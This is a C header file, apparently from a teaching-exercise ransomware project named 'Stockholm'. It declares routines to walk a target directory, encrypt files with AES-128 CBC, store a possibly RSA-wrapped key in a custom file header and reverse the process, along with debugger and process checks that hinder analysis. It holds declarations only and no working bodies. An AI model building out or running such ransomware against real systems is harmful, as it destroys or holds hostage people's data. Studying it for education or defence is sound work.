#ifndef STOCKHOLM_H
# define STOCKHOLM_H

# include <stdio.h>
# include <stdlib.h>
# include <fcntl.h>
# include <unistd.h>
# include <stdint.h>
# include <sys/mman.h>      // For mapping
# include <elf.h>           // For ELF header
# include <string.h>
# include <time.h>          // For rand & srand (encryption key generation)
# include <dirent.h>        // For looping through directory
# include <stdbool.h>
# include <sys/stat.h>      // For checking if directory
# include <openssl/aes.h>   // For AES key generation
# include <openssl/rand.h>
#include <getopt.h>         // For argv parsing

/*-------------------------------- Colors ---------------------------------*/

/* Text colors */
# define FA_RED_COLOR           "\033[31m"
# define FA_GREEN_COLOR         "\033[32m"
# define FA_YELLOW_COLOR        "\033[33m"
# define FA_RESET_COLOR         "\033[0m"

/* Background colors */
# define FA_RESET_BG_COLOR      "\033[49m"

/*------------------------ Defines, enum, struct --------------------------*/

// Paths of the target directories
# define FA_TARGET_ARRAY_SIZE   1
# define FA_TARGET_PATHS        { "/home/mint/infection/" }

// Unhandled paths
# define FA_UNHANDLED_DIRS_ARRAY_SIZE   2
# define FA_UNHANDLED_DIRS      { ".", ".." }

// Returns
enum fa_e_returns
{
    FA_SUCCESS,
    FA_ERROR
};

// Maximum amount of handled files on a directory
# define FA_MAX_FILES           1024

// Charset used for the encryption key
# define FA_KEYCHARSET          "abcdefghijklmnopqrstuvwxyz" \
                                "ABCDEFGHIJKLMNOPQRSTUVWXYZ" \
                                "0123456789"
// Signature injected in the target files's Stockholm header
# define FA_SIGNATURE           "STOCKHLM"
# define FA_STOCKHLM_EXT        "ft"
# define FA_STOCKHLM_EXT_SIZE    3
# define FA_AES_KEY_SIZE         16
# define FA_AES_BLOCK_SIZE       16

enum fa_e_modes
{
    // Display detailed notifications
    FA_VERBOSE                  = 1,
    FA_REVERSE                  = 2
};

enum fa_e_stockhlm_header
{
    FA_STOCKHLM_HEADER_SIZE      = 0x0118,
    FA_MAGICNBR_SIZE             = 8,
    FA_ENCRYPT_KEY_SIZE          = 256,

    // Header offsets
    FA_HDR_OFF_SIGN             = 0x0,
    FA_HDR_OFF_ENCRYPT_KEY_SIZE  = 0x8,
    FA_HDR_OFF_ENCRYPT_KEY      = 0xc,
    FA_HDR_OFF_FILETYPE         = 0x10c,
    FA_HDR_OFF_FILESIZE         = 0x110
};

/*
 * This is the Stockholm header that is written before the original header.
 * It has a size of 0x0118 (= 280) bytes.
 */

typedef struct fa_s_stockhlm_header
{
    // 0x0000 Magic value/signature to identify encrypted files.
    uint8_t     signature[FA_MAGICNBR_SIZE];

    /*
     * 0x0008 Size (in bytes) of the encrypted AES key.
     * Typically 256 bytes for a 2048-bit RSA key.
     */

    uint32_t    encrypted_key_len;

    /*
     * 0x000C RSA encrypted AES file encryption key.
     * AES-128 key (16 bytes) is encrypted using RSA-2048 and stored here.
     *
     * If the asymmetric encryption mode is disabled, a unencrypted
     * AES-128 key is stored.
     */

    uint8_t     encryption_key[FA_ENCRYPT_KEY_SIZE];

    /*
     * 0x010C File type internal to this program.
     * 
     * This is the original file type of the encrypted file.
     * It is used during decryption to restore file format.
     */

    uint32_t    original_filetype;

    // 0x0110 Original file size
    uint64_t    original_filesize;

    // 0x0118 Encrypted file contents  (AES-128 CBC)
}               fa_t_stockhlm_header;

/*---------------------------- Global variables ---------------------------*/

typedef struct fa_s_env
{
    unsigned char        *g_mapped_data; // file is mapped in memory here
    uint16_t             g_modes;        // options given from command line
    fa_t_stockhlm_header g_stockhlm_header;
    size_t               g_encrypted_filesize;
    char                 *g_decryption_key;
}   fa_t_env;

/*---------------------------- Function prototypes ------------------------*/

void    fa_parse_argv(fa_t_env *env, int argc, char *argv[]);

char    *fa_get_filename(char *argv[]);
int     fa_map_file_into_memory(fa_t_env *env, const char *filename);
int     fa_process_mapped_data(fa_t_env *env);
int     fa_write_processed_data_to_file(fa_t_env *env, const char *target_path);

/*---------------------------- cryptography ------------------------*/

void    xor_with_additive_cipher(
    void *key, size_t key_length, void *data, size_t data_length, int mode);

int     aes_encrypt_data(unsigned char *data, size_t data_len, \
    const unsigned char *key, unsigned char *iv);
int     aes_decrypt_data(unsigned char *data, size_t data_len, \
    const unsigned char *key, unsigned char *iv);
unsigned char    *fa_keygen(const char *_charset, size_t strength);
unsigned char    *get_encryption_key(fa_t_env *env);

/*---------------------------- process checkers ------------------------*/

bool    pc_is_debugger_attached(void);
bool    pc_is_process_running(const char *process_name);

/*---------------------------- file handling ------------------------*/

bool    is_extension_handled(fa_t_env *env, char *filepath);
void    handle_dir(fa_t_env *env, char *target_dir_path);

#endif
